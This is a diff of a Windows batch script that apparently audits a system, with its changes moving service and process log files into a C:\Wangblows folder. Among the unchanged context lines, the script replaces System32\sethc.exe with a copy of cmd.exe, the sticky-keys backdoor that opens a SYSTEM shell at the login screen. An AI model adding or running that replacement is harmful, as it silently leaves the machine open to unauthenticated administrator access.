@@ -21,7 +21,7 @@ If %ERRORLEVEL% == 1 (
 )
 
 :@@@INTITIAL SERVICE CONFIG@@@
-start cmd.exe /c sc query >> C:\Services_Original.txt
+start cmd.exe /c sc query >> C:\Wangblows\Services_Original.txt
 if %errorlevel%==1 ( echo Failed to write Original Services >> C:\Wangblows\Wangblows.txt
 ) else (
 echo Outputted Original Service Configs.
@@ -56,7 +56,7 @@ ren "%systemroot%\System32\sethc.exe" "%systemroot%\System32\sethc1.exe"
 copy "%systemroot%\System32\cmd.exe" "%systemroot%\System32\sethc.exe"
 
 :@@@CURRENTLY RUNNING SERVICES@@@
-start cmd.exe /c net start >> C:\Services_Started.txt
+start cmd.exe /c net start >> C:\Wangblows\Services_Started.txt
 if %errorlevel%==1 echo Running services failed to write >> C:\Wangblows\Wangblows.txt
 
 
@@ -167,8 +167,8 @@ goto MENU
 
 :Two
 REM Listing possible penetrations
-cd C:\
-echo "STARTING TO OUTPUT PROCESS FILES DIRECTLY TO THE C:\ DRIVE!"
+cd C:\Wangblows\
+echo "STARTING TO OUTPUT PROCESS FILES DIRECTLY TO THE C:\Wangblows\ DRIVE!"
 wmic process list brief > BriefProcesses.txt
 if %errorlevel%==1 echo Brief Processes failed to write
 wmic process list full >FullProcesses.txt
